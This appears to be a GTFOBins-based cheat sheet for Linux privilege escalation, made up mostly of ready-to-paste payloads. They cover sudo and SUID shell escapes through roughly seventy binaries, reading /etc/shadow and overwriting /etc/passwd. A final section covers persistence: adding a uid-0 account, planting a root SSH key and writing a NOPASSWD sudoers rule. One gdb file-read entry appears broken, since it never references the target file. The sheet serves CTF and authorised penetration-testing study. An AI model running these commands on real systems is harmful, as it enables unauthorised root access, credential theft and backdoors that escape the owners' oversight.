---
title: "GTFOBins Quick Reference"
category: misc
subcategory: privesc
type: reference
tags: [gtfobins, privesc, suid, sudo, file-read, file-write, shell-escape, linux, binary-abuse, lolbins, reference, cheatsheet]
summary: "The 60 most useful GTFOBins entries with their sudo, SUID, file-read, file-write and shell payloads."
tools: [gtfobins, sudo, find, bash]
related: [linux-privesc, shell-jail-escape, jail-escape-payloads, container-escape, ctf-general-cheatsheet]
source:
  name: "GTFOBins"
  url: "https://gtfobins.github.io/"
---

## How to use this

1. `sudo -l` and `find / -perm -4000 -type f 2>/dev/null` give you the binary list.
2. Look the binary up below. If it is here, you are done.
3. **SUID payloads need `-p`** on the spawned shell (`/bin/sh -p`), otherwise bash and dash
   drop the effective uid.
4. For SUID abuse, many payloads need the euid preserved explicitly; where the entry shows a
   different SUID form, use that one rather than the sudo form.

## Capability matrix

| Binary | shell | sudo | SUID | file read | file write | notes |
| --- | :-: | :-: | :-: | :-: | :-: | --- |
| `awk` | x | x | x | x | x | `system()` and `getline` |
| `base32` | | x | x | x | | read only, base32-encoded |
| `base64` | | x | x | x | | read only, base64-encoded |
| `bash` | x | x | x | x | x | remember `-p` |
| `busybox` | x | x | x | x | x | includes its own applets |
| `cat` | | x | x | x | | |
| `chmod` | | x | x | | | make anything setuid |
| `chown` | | x | x | | | take ownership of a file |
| `cp` | | x | x | x | x | overwrite `/etc/passwd` |
| `cpulimit` | x | x | x | | | runs an arbitrary command |
| `crontab` | x | x | | | | edits root's crontab |
| `curl` | | x | x | x | x | `file://` for read, `-o` for write |
| `date` | | x | x | x | | `-f` prints the file as parse errors |
| `dd` | | x | x | x | x | |
| `diff` | | x | x | x | | `--line-format` prints the file |
| `dmsetup` | x | x | | | | |
| `docker` | x | x | | x | x | group membership alone is root |
| `ed` | x | x | x | x | x | `!sh` |
| `emacs` | x | x | x | x | x | `--eval` |
| `env` | x | x | x | | | `env /bin/sh -p` |
| `expect` | x | x | x | | | `spawn` |
| `find` | x | x | x | | | `-exec` |
| `flock` | x | x | x | | | |
| `ftp` | x | x | | | | `!sh` |
| `gawk` | x | x | x | x | x | as awk |
| `gcc` | x | x | x | | | `-wrapper` |
| `gdb` | x | x | x | x | x | `-ex` |
| `git` | x | x | x | x | | pager, hooks, `-c core.pager` |
| `grep` | | x | x | x | | prints matching lines of any file |
| `head` | | x | x | x | | |
| `ionice` | x | x | x | | | |
| `jq` | | x | x | x | | `--rawfile` / error messages |
| `journalctl` | x | x | x | | | pager escape |
| `ld.so` | x | x | x | | | `/lib/ld-linux.so.2 /bin/sh` |
| `less` | x | x | x | x | | `!sh` in the pager |
| `ltrace` | x | x | | | | |
| `lua` | x | x | x | x | x | `os.execute` |
| `make` | x | x | x | | | `-s --eval` |
| `man` | x | x | | x | | pager escape |
| `more` | x | x | x | x | | pager escape |
| `mount` | x | x | x | | | with a helper, or `--bind` |
| `mv` | | x | x | | x | replace a file root reads |
| `mysql` | x | x | x | x | | `\!sh` |
| `nano` | x | x | x | x | x | `^R^X` |
| `nc` | | x | x | x | x | file transfer |
| `nice` | x | x | x | | | |
| `nmap` | x | x | x | x | x | `--script` (NSE) |
| `node` | x | x | x | x | x | `child_process` |
| `nohup` | x | x | x | | | |
| `openssl` | | x | x | x | x | `enc` in and out |
| `perl` | x | x | x | x | x | |
| `php` | x | x | x | x | x | |
| `pip` | x | x | | | | `install .` runs setup.py |
| `python`/`python3` | x | x | x | x | x | |
| `rsync` | x | x | x | | | `-e`, `--rsh` |
| `ruby` | x | x | x | x | x | |
| `sed` | x | x | x | x | | `-e '1e sh'` (GNU), `-n 'p'` |
| `socat` | x | x | x | x | x | |
| `sort` | | x | x | x | | prints the file |
| `sqlite3` | x | x | x | x | x | `.shell`, `readfile`, `writefile` |
| `ssh` | x | x | | | | `ProxyCommand` |
| `strace` | x | x | x | | | `-o /dev/null cmd` |
| `systemctl` | x | x | x | | | pager, or a transient unit |
| `tar` | x | x | x | x | x | `--checkpoint-action` |
| `tcpdump` | x | x | | | | `-z postrotate-command` |
| `tee` | | x | x | | x | |
| `tmux` | x | x | x | | | |
| `vi`/`vim` | x | x | x | x | x | `:!sh` |
| `watch` | x | x | x | | | `-x sh -c` |
| `wget` | | x | x | x | x | `-i file`, `-O` |
| `xargs` | x | x | x | | | `-a /dev/null sh` |
| `xxd` | | x | x | x | x | |
| `zip` | x | x | x | | | `-T -TT` |

## Shell escapes (sudo form)

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo bash
sudo busybox sh
sudo cpulimit -l 100 -f /bin/sh
sudo crontab -e                     # set EDITOR=/bin/sh first
sudo dmsetup create x --notable ; sudo dmsetup ls --exec '/bin/sh -s'
sudo ed
!/bin/sh
sudo emacs -Q -nw --eval '(term "/bin/sh")'
sudo env /bin/sh
sudo expect -c 'spawn /bin/sh;interact'
sudo find . -exec /bin/sh \; -quit
sudo flock -u / /bin/sh
sudo ftp
!/bin/sh
sudo gcc -wrapper /bin/sh,-s .
sudo gdb -nx -ex '!sh' -ex quit
sudo git -p help                    # then !/bin/sh in the pager
sudo git -c core.pager='!/bin/sh' log
sudo ionice /bin/sh
sudo journalctl                     # then !/bin/sh
sudo /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 /bin/sh
sudo less /etc/hosts                # then !/bin/sh
sudo ltrace -b -L /bin/sh
sudo lua -e 'os.execute("/bin/sh")'
sudo make -s --eval='$(shell /bin/sh 1>&0)' .
sudo man man                        # then !/bin/sh
sudo more /etc/hosts                # then !/bin/sh
sudo mysql -e '\! /bin/sh'
sudo nano -s /bin/sh                # then ^T (older nano); or ^R^X
sudo nice /bin/sh
sudo nmap --interactive             # very old nmap only
TF=$(mktemp); echo 'os.execute("/bin/sh")' > $TF; sudo nmap --script=$TF
sudo node -e 'require("child_process").spawn("/bin/sh",{stdio:[0,1,2]})'
sudo nohup /bin/sh -c 'sh <$(tty) >$(tty) 2>$(tty)'
sudo perl -e 'exec "/bin/sh";'
sudo php -r "system('/bin/sh');"
TF=$(mktemp -d); echo 'import os;os.execl("/bin/sh","sh","-c","sh")' > $TF/setup.py; sudo pip install $TF
sudo python3 -c 'import os;os.system("/bin/sh")'
sudo rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
sudo ruby -e 'exec "/bin/sh"'
sudo sed -n '1e exec sh 1>&0' /etc/hosts
sudo socat stdin exec:/bin/sh
sudo sqlite3 /dev/null '.shell /bin/sh'
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
sudo strace -o /dev/null /bin/sh
sudo systemctl                      # then !sh in the pager
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z /bin/sh -Z root
sudo tmux
sudo vi -c ':!/bin/sh' /dev/null
sudo vim -c ':!/bin/sh'
sudo watch -x sh -c 'reset; exec sh 1>&0 2>&0'
sudo xargs -a /dev/null sh
TF=$(mktemp -u); sudo zip $TF /etc/hosts -T -TT 'sh #'
```

## SUID form (note the `-p`)

```bash
# generic pattern: the payload must keep the euid, so spawn with -p
./suid_bash -p
awk 'BEGIN {system("/bin/sh -p")}' ; # if awk is SUID
busybox sh                           # busybox applets inherit the euid
env /bin/sh -p
find . -exec /bin/sh -p \; -quit
gdb -nx -ex 'python import os; os.execl("/bin/sh","sh","-p")' -ex quit
ionice /bin/sh -p
/lib/ld-linux.so.2 /bin/sh -p        # when ld.so itself is SUID
make -s --eval='$(shell /bin/sh -p 1>&0)' .
nice /bin/sh -p
node -e 'require("child_process").spawn("/bin/sh",["-p"],{stdio:[0,1,2]})'
perl -e 'exec "/bin/sh", "-p";'
php -r "pcntl_exec('/bin/sh', ['-p']);"
python3 -c 'import os;os.setuid(0);os.system("/bin/sh")'   # only with cap_setuid or euid 0 kept
rsync -e 'sh -p -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
strace -o /dev/null /bin/sh -p
tmux
vim -c ':!/bin/sh -p'
watch -x sh -c 'reset; exec sh -p 1>&0 2>&0'
xargs -a /dev/null sh -p
```

## File read (`LFILE` is the target path)

```bash
LFILE=/etc/shadow
sudo awk '//' "$LFILE"
sudo base32 "$LFILE" | base32 -d
sudo base64 "$LFILE" | base64 -d
sudo cat "$LFILE"
sudo cp "$LFILE" /dev/stdout
sudo curl file://"$LFILE"
sudo date -f "$LFILE"
sudo dd if="$LFILE"
sudo diff --line-format=%L /dev/null "$LFILE"
sudo ed "$LFILE"                     # then: ,p
sudo emacs "$LFILE"
sudo gdb -nx -ex "dump binary memory /dev/stdout 0 0" -ex quit    # (see project docs)
sudo grep '' "$LFILE"
sudo head -c 1G "$LFILE"
sudo jq -Rr . "$LFILE"
sudo less "$LFILE"
sudo lua -e 'print(io.open(os.getenv("LFILE")):read("*a"))'
sudo more "$LFILE"
sudo mysql -e "\! cat $LFILE"
sudo nano "$LFILE"
sudo nmap -iL "$LFILE"               # filenames echoed back as errors
sudo node -e "console.log(require('fs').readFileSync(process.env.LFILE,'utf8'))"
sudo openssl enc -in "$LFILE"
sudo perl -ne 'print' "$LFILE"
sudo php -r "echo file_get_contents(getenv('LFILE'));"
sudo python3 -c "print(open('$LFILE').read())"
sudo ruby -e 'puts File.read(ENV["LFILE"])'
sudo sed '' "$LFILE"
sudo sort -m "$LFILE"
sudo sqlite3 /dev/null -cmd ".read $LFILE"
sudo sqlite3 /dev/null "SELECT readfile('$LFILE')"
sudo tail -c 1G "$LFILE"
sudo tar cf /dev/stdout "$LFILE"
sudo vim "$LFILE"
sudo wget -i "$LFILE"                # filenames echoed in errors
sudo xxd "$LFILE" | xxd -r
sudo git diff --no-index /dev/null "$LFILE"
```

## File write

```bash
LFILE=/etc/passwd
echo DATA | sudo tee "$LFILE"
echo DATA | sudo dd of="$LFILE"
sudo cp /tmp/src "$LFILE"
sudo mv /tmp/src "$LFILE"
sudo curl file:///tmp/src -o "$LFILE"
sudo wget http://127.0.0.1/x -O "$LFILE"
sudo openssl enc -in /tmp/src -out "$LFILE"
echo DATA | sudo xxd | sudo xxd -r - "$LFILE"
sudo lua -e 'io.open(os.getenv("LFILE"),"w"):write("DATA")'
sudo node -e "require('fs').writeFileSync(process.env.LFILE,'DATA')"
sudo perl -e 'open(F,">",$ENV{LFILE});print F "DATA";'
sudo php -r "file_put_contents(getenv('LFILE'),'DATA');"
sudo python3 -c "open('$LFILE','w').write('DATA')"
sudo ruby -e 'File.write(ENV["LFILE"],"DATA")'
sudo sqlite3 /dev/null "SELECT writefile('$LFILE','DATA')"
sudo ed "$LFILE"                     # a, type text, ., w, q
sudo vim -c ':w! /etc/passwd' /tmp/src
sudo tee -a "$LFILE" <<< 'root2:$1$x$...:0:0::/root:/bin/bash'
```

## The three highest-value follow-ups after a file write

```bash
# 1. append a uid-0 account to /etc/passwd
openssl passwd -1 -salt xx pass123
echo 'r00t:$1$xx$HASHHERE:0:0:root:/root:/bin/bash' >> /etc/passwd && su r00t

# 2. drop an SSH key for root
mkdir -p /root/.ssh && echo 'ssh-ed25519 AAAA... you@host' >> /root/.ssh/authorized_keys

# 3. add a sudoers rule
echo 'user ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/pwn && chmod 440 /etc/sudoers.d/pwn
```

## Reminders

```text
- Always confirm with `id` after the escape; a shell that is still uid 1000 means you
  forgot `-p` or the binary dropped privileges itself.
- `sudo -l` output naming a binary NOT in this list still deserves a look at
  https://gtfobins.github.io/ - the site has several hundred entries.
- Some payloads differ between GNU and BSD/busybox versions of the same tool.
- Pager escapes (`less`, `man`, `more`, `journalctl`, `systemctl`, `git`) need a terminal;
  in a non-interactive shell they fail silently. Upgrade to a pty first.
- `LFILE`/`LDIR` are the variable names GTFOBins uses in its own examples, kept here so the
  payloads can be pasted next to the site's text.
```
